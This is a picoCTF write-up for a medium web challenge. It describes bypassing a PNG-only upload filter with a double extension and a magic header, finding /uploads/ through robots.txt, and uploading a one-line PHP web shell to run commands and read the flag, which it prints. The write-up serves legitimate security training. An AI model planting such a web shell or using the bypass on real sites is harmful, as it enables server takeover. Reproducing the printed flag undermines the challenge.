
# Trickster

*Medium*

> ### Description
>
> I found a web app that can help process images: PNG images only!
> Try it [here](http://atlas.picoctf.net:59351/)!

We are greeted with a simple web application that wants to process PNG images.
When we upload a valid PNG image file it says: *"File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully"*. 

But when we upload a non PNG file, we get: *"Error: File name does not contain '.png'."*. So it seems like it only checks for a .png in the filename.

So now we try to upload a file with name **file.png.php**. It has .png in the name, we get a different error message: *"Error: The file is not a valid PNG image: 666f6f62"*. 666f6f62 is *"foob"* in ascii, the start of our file (The file content was foobar). So it seems like the application checks the magic file header. The magic file header of PNG is **PNG**. When we add this to our file, it lets us upload it.

This allows me to upload any file if I just add a ".png" in the name and add the "PNG" magic header. 

>At this point I was not quite sure what to do, and without thinking about it, I searched for a writeup. The first line just said something about /robots.txt, and I was yeahhhh, I should do that... (stupid of me)... Always do some reconnaisanse.

In the robots.txt we find this: \
*User-agent: \*\
Disallow: /instructions.txt\
Disallow: /uploads/*

Now we find that we can access our uploaded files through /uploads/file.png.php!

We upload our simple phpWebShell.png.php:
```
PNG<?php echo system($_GET['command']); ?>
```
Now navigate to /uploads/phpWebShell.png.php?command=ls, here we see all our uploaded files. If we use "ls .." we see the basic files such as index.php, but also a weird file called "MFRDAZLDMUYDG.txt". Let's cat this file with "cat+../MFRDAZLDMUYDG.txt". 

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
</details>